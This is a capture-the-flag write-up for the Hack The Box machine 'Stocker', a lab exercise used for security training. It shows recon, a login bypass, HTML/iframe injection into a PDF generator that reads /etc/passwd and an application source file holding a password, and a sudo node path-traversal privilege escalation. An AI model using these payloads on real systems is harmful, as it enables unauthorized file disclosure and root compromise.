# Stocker Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA stocker 10.10.11.196 -T4``

``22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)``

``80/tcp open  http    nginx 1.18.0 (Ubuntu)``

# ${{\color{purple}Initial Foothold}}\ $

``ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.stocker.htb/``

![image](https://user-images.githubusercontent.com/123066149/221412809-e0e3d7d7-885d-42c7-ba78-1797f9af88d3.png)

![image](https://user-images.githubusercontent.com/123066149/221412903-86651091-7b69-4c0d-bcd6-edac6a36c7d6.png)

### After several techniques that I found in this resource :

https://book.hacktricks.xyz/pentesting-web/login-bypass

![1](https://user-images.githubusercontent.com/123066149/221413154-f34bf355-462e-4223-acd4-ff2e4fabd5d1.PNG)

### I managed to get an error message :

![2](https://user-images.githubusercontent.com/123066149/221413230-f9a77189-539d-44e8-b14d-9085b09ffcbe.PNG)

### I managed to bypass the authentication with this payload :

![3](https://user-images.githubusercontent.com/123066149/221413358-9bfebf0f-2452-424f-ba06-855b408927f2.PNG)

### I found this with burp sniper attack :

![4](https://user-images.githubusercontent.com/123066149/221413666-3af09096-91d9-4872-9c4b-f93a2ac1880c.PNG)

### Delet the url encode :

![5](https://user-images.githubusercontent.com/123066149/221413668-4c6ff2a1-c2af-442d-b2c2-289e23856004.PNG)

![6](https://user-images.githubusercontent.com/123066149/221413675-0fc96cf4-fd0a-4b51-9455-9e429ee8ffca.PNG)

# ${{\color{purple}Exploitation}}\ $

### After studying the normal behavior of the application : 

![image](https://user-images.githubusercontent.com/123066149/221413867-4c827c22-af34-4517-b21f-015617de7121.png)

![image](https://user-images.githubusercontent.com/123066149/221413929-5440ede3-84f2-4845-8048-76bc672a89fc.png)

![image](https://user-images.githubusercontent.com/123066149/221414000-97690b10-fc23-472f-a7e4-6f9b04675c82.png)

![image](https://user-images.githubusercontent.com/123066149/221414028-5d7321d3-eb21-431b-8b78-fe0bc13bf31b.png)

``wget http://dev.stocker.htb/api/po/63fb613c77f6ecd01ecb786b``

![image](https://user-images.githubusercontent.com/123066149/221414189-33a5c81b-e391-4f09-9a2c-de042b4a2cc3.png)

``exiftool 63fb613c77f6ecd01ecb786b``

![7](https://user-images.githubusercontent.com/123066149/221414242-b46cf8d9-c9b0-4a57-a5db-c6f76a26b2fe.PNG)

``searchsploit skia``

![8](https://user-images.githubusercontent.com/123066149/221414306-88ba81bf-2e57-411e-9518-c1c328a8019f.PNG)

### To go faster I used an h1 tag :

``<h1>TEST</h1>``

``<img src=test.test/>``

![image](https://user-images.githubusercontent.com/123066149/221414460-0deb45e9-2fbb-436e-a74e-2bf71ea8dee4.png)

![image](https://user-images.githubusercontent.com/123066149/221414536-f6f4bfd9-40f4-4778-b347-a133af89b24c.png)

![image](https://user-images.githubusercontent.com/123066149/221414856-a46d4a74-ec6a-4d34-b34f-43df33c17e4e.png)

![image](https://user-images.githubusercontent.com/123066149/221414926-aefcc230-fc58-4b7a-8335-67078de2c123.png)

### There was not enough space in the output of the first payload :

![image](https://user-images.githubusercontent.com/123066149/221415026-65693274-4f81-46a8-9188-c3085f1b09eb.png)

### So I adapted the payload :

<iframe src=file:///etc/passwd height=1000px width=1000px></iframe></iframe>

![image](https://user-images.githubusercontent.com/123066149/221415134-e94110d9-02fe-48be-b167-38b53deb1437.png)

### After having found the user angoose it is necessary to enumerate to find the password :

<iframe src=file:///var/www/dev/index.js height=1000px width=1000px></iframe>

![image](https://user-images.githubusercontent.com/123066149/221415303-3c7d989a-eaa1-4e5f-b5b8-32ca3e65bde3.png)

![image](https://user-images.githubusercontent.com/123066149/221415429-e8ab243e-ed6d-466d-af01-75655ceb2837.png)

# ${{\color{purple}Privilege Escalation}}\ $

``sudo -l``

![image](https://user-images.githubusercontent.com/123066149/221415501-a39a3dad-271b-4a7d-bfe6-5088cab41a86.png)

### The right resource is :

https://stackabuse.com/executing-shell-commands-with-node-js/

![image](https://user-images.githubusercontent.com/123066149/221415635-dbc57e9d-3084-4f35-aefe-4a1cb599249e.png)

``sudo /usr/bin/node /usr/local/scripts/../../../../../../tmp/test.js``

![image](https://user-images.githubusercontent.com/123066149/221415711-d66e7689-eb00-4bda-b51e-448db19c8055.png)

# ${{\color{purple}Points of Improvement}}\ $
